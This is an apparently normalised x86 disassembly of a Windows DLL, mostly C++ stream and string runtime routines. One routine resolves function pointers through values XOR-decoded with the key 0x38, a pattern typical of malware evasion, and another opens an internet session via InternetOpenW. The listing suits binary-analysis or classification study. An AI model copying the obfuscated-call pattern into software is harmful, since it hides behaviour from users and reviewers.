call sub_10069d0f
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ebx [ ebp - 0xc ]
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ebx [ ebp - 0xc ]
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
movzx eax [ ebp - 0x8 ]
movzx ecx [ ebp + 0x12 ]
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001b303
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001b303
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
cmp [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
movzx eax [ ebp - 0x8 ]
movzx ecx [ ebp + 0x12 ]
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
mov ebx [ ebp - 0x8 ]
cmp [ ebp + 0x12 ] bx
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001b303
or [ esi ] eax
add esp 0x18
dec [ ebx ]
mov ebx [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001b303
add esp 0x18
or [ esi ] eax
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
movzx ecx [ ebp + 0x12 ]
movzx eax bx
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001b303
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001b303
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
sub_10068730
mov edx [ ecx + 0x20 ]
push esi
mov esi [ edx ]
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x30 ]
mov ebx [ edi ]
mov eax esi
add ebx eax
cmp eax ebx
jae r-xdata
or eax 0xffffffff
pop esi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ esi ]
pop edi
pop ebx
pop esi
retn
pop edi
pop ebx
or eax 0xffffffff
pop esi
retn
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp eax esi
ja r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
cmp [ ecx + 0x3c ] esi
jbe r-xdata
mov eax [ ecx + 0x3c ]
mov edx [ edx ]
sub eax edx
mov [ edi ] eax
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
movzx eax [ eax ]
pop edi
pop ebx
pop esi
retn
mov [ ecx + 0x3c ] eax
sub_100687a0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x30
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ esp + 0x14 ] ecx
mov ecx [ ebp + 0x10 ]
push ebx
mov [ esp + 0x1c ] edx
mov edx [ ebp + 0x14 ]
mov [ esp + 0x20 ] ecx
mov ecx [ ebp + 0x18 ]
push esi
xor eax eax
mov [ esp + 0x28 ] edx
mov edx [ ebp + 0x1c ]
mov [ esp + 0x2c ] ecx
mov ecx [ ebp + 0x20 ]
mov bl 0x38
push eax
mov [ esp + 0x34 ] edx
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov [ esp + 0x38 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
sub_100688b0
push ebp
mov ebp esp
push 0xffffffff
push sub_100885a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov edi ecx
mov ecx [ eax ]
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax ecx
mov esi edx
lea edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x68 ] edx
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax [ ebp - 0x68 ]
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x2c ]
call sub_1005ddc0
lea eax [ ebp - 0x2c ]
mov edx esi
push eax
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x0
call sub_1005bbc0
push eax
mov edx ebx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1001ccb0
add esp 0x8
push 0xffffffff
xor ebx ebx
push ebx
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_10017b50
mov esi 0x8
cmp [ ebp - 0x34 ] esi
jb r-xdata
xor edx edx
mov edi 0x7
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_100187af
add esp 0x4
sub_100689d0
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x87
cmp eax 0x4
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x30 ]
mov [ esi ] eax
mov eax [ ecx + 0x34 ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x86
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
call sub_10053240
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_10068a60
push ebp
mov ebp esp
push 0xffffffff
push sub_10084fc3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi + 0x4 ] 0x1
mov edi [ ebp + 0x8 ]
xor edx edx
mov [ esi ] r--data
mov [ esi + 0x8 ] edx
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov al [ edi + 0x14 ]
mov [ esi + 0x14 ] al
mov eax [ edi + 0x18 ]
mov [ ebp - 0x4 ] edx
cmp eax edx
jne r-xdata
lea ecx [ esi + 0x18 ]
push eax
mov [ ecx ] edx
mov [ ecx + 0x4 ] dl
call sub_1004ed30
push edi
push esi
mov [ ebp - 0x4 ] 0x1
call sub_10019337
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea eax [ edi + 0x1c ]
sub_10068b0b
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1004c1a2
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10068b4b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_10058c10
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_10068b7d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
mov ebx [ ebp + 0xc ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
push r--data
call sub_1002d84e
test ebx ebx
je r-xdata
push r--data
call sub_1000831a
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10070030
test al al
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx edi
add edx edx
push edx
lea ecx [ ecx + edi * 2 ]
push ecx
lea ecx [ edi + ebx ]
lea eax [ eax + ecx * 2 ]
push eax
call sub_1007ec90
add esp 0xc
push [ ebp + 0x10 ]
mov ecx esi
push ebx
push edi
call sub_1004b2a0
cmp [ esi + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
sub_10068c90
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ esi + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add eax [ edi + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ esi + 0x8 ]
add [ edi + 0x28 ] ecx
mov edx [ esi + 0x8 ]
mov ecx [ esi + 0x18 ]
push ebx
push edx
push ecx
push eax
call sub_1007f5d0
mov eax [ edi + 0x38 ]
lea ebx [ edi + 0x34 ]
add esp 0xc
cmp esi eax
jae r-xdata
pop edi
mov eax 0x1
pop esi
pop ebp
retn 0x4
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebx ]
cmp ecx esi
ja r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
call sub_10057850
sub esi ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x20
mov edx [ edi + 0x2c ]
pop ebx
cmp [ edi + 0x28 ] edx
jne r-xdata
mov ecx 0x8
mov edi eax
[ edi ] [ esi ]
mov edi [ ebp + 0x8 ]
and esi 0xffffffe0
add esi [ ebx ]
jmp r-xdata
mov edx ebx
call sub_10057850
pop edi
mov eax 0x2
pop esi
pop ebp
retn 0x4
mov ecx [ edi + 0x24 ]
call sub_10047d50
mov [ edi + 0x30 ] eax
pop edi
xor eax eax
pop esi
pop ebp
retn 0x4
sub_10068d40
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
push ebx
mov bl [ ebp + 0x18 ]
push esi
push edi
test bl 0x1
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test bl 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov ecx esi
or ecx ebx
je r-xdata
mov eax [ edx ]
mov [ ebp + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov esi [ r--data ]
mov ebx [ r--data ]
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test edx edx
je r-xdata
test bl 0x2
jne r-xdata
test ebx ebx
jl r-xdata
test edx edx
je r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
jg r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
jg r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
jl r-xdata
jl r-xdata
sub edi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x18 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ ebp + 0x18 ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_10068f00
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x14 ]
push esi
push eax
mov eax [ ebp + 0x10 ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
mov [ esi ] 0x0
call [ InternetOpenW@IAT ]
xor edx edx
test eax eax
setne dl
mov [ esi ] eax
push edx
call sub_1002cbe0
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x18
sub_10068f40
push ebp
mov ebp esp
push 0xffffffff
push sub_100884c2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10021f90
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0xffffffff
xor eax eax
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] ax
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10021f90
push 0xffffffff
xor esi esi
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] si
push eax
jmp r-xdata
call sub_100404a0
sub_10069020
push ebx
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0xa8 ] 0x8
push edi
jb r-xdata
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0xa8 ] ebx
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] cx
cmp [ esi + 0x8c ] 0x8
jb r-xdata
mov eax [ esi + 0x94 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ esi + 0x8c ] ebx
mov [ esi + 0x88 ] edi
mov [ esi + 0x78 ] ax
cmp [ esi + 0x70 ] 0x8
jb r-xdata
mov edx [ esi + 0x78 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ esi + 0x70 ] ebx
mov [ esi + 0x6c ] edi
mov [ esi + 0x5c ] dx
cmp [ esi + 0x54 ] 0x8
jb r-xdata
mov ecx [ esi + 0x5c ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ esi + 0x54 ] ebx
mov [ esi + 0x50 ] edi
mov [ esi + 0x40 ] cx
cmp [ esi + 0x38 ] 0x8
jb r-xdata
mov eax [ esi + 0x40 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ esi + 0x38 ] ebx
mov [ esi + 0x34 ] edi
mov [ esi + 0x24 ] ax
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov edx [ esi + 0x24 ]
push edx
call sub_100187af
add esp 0x4
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] ebx
xor edx edx
pop edi
mov [ esi + 0x4 ] dx
pop esi
pop ebx
retn
mov ecx [ esi + 0x4 ]
push ecx
call sub_100187af
add esp 0x4
sub_10069110
push ebp
mov ebp esp
push 0xffffffff
push sub_10087cbb
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov edx [ edi ]
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov esi [ edx + 0x4 ]
add esi edi
call sub_1000fe50
mov eax [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] ebx
call sub_10042f90
mov [ esi + 0x40 ] ax
cmp [ esi + 0x38 ] ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
mov edx [ ecx + 0x4 ]
mov [ edi + edx + 0x10 ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
or eax 0x4
or eax 0x4
push ebx
mov ecx esi
call sub_1001bdc0
sub_100691b6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x50
push 0x1
call sub_10067d3a
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_1002fb6b
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_10035d06
pop edi
pop esi
pop ebx
leave
retn
